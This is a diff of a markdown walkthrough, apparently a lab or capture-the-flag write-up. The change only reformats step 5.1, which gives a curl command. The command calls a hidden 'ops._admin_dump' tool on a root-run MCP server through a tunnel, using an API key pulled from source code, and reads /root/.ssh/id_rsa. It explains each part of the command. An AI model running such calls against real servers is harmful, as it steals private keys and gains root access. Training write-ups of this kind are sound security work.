@@ -1906,24 +1906,24 @@ If you're curious for learning purposes, you could test the analyst password as 
 
 ### 5.1 Call `ops._admin_dump` via the OPSMCP tunnel (port 15000)
 
-```
-`curl -s http://localhost:15000/tools/call \
+```bash
+curl -s http://localhost:15000/tools/call \
   -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
   -H "Content-Type: application/json" \
-  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'`
+  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
 ```
 
 Breakdown:
 
-- http://localhost:15000/tools/call
-  - Description: The tunneled OPSMCP endpoint that executes a named tool.
-  - Purpose: 15000 → tunnel → target's 127.0.0.1:5000/tools/call, where server.py (running as root) processes the request.
-- -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"
-  - Description: Sets the custom auth header check_auth() checks for.
-  - Purpose: Without this, every /tools/call request returns 401 Unauthorized. We extracted this exact value from the source code.
-- -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
-  - Description: JSON body specifying which tool to call and its arguments.
-  - Purpose: name selects the hidden ops._admin_dump tool from ALL_TOOLS. target: "ssh_keys" selects the branch that reads /root/.ssh/id_rsa. confirm: true is required — the code returns a warning instead of executing if confirm is falsy/missing.
+- `http://localhost:15000/tools/call`
+	- Description: The tunneled OPSMCP endpoint that executes a named tool.
+	- Purpose: 15000 → tunnel → target's 127.0.0.1:5000/tools/call, where server.py (running as root) processes the request.
+- `-H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"`
+	- Description: Sets the custom auth header check_auth() checks for.
+	- Purpose: Without this, every /tools/call request returns 401 Unauthorized. We extracted this exact value from the source code.
+- `-d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'`
+	- Description: JSON body specifying which tool to call and its arguments.
+	- Purpose: name selects the hidden ops._admin_dump tool from ALL_TOOLS. target: "ssh_keys" selects the branch that reads /root/.ssh/id_rsa. confirm: true is required — the code returns a warning instead of executing if confirm is falsy/missing.
 <div align="center">
 <br>
 <br>
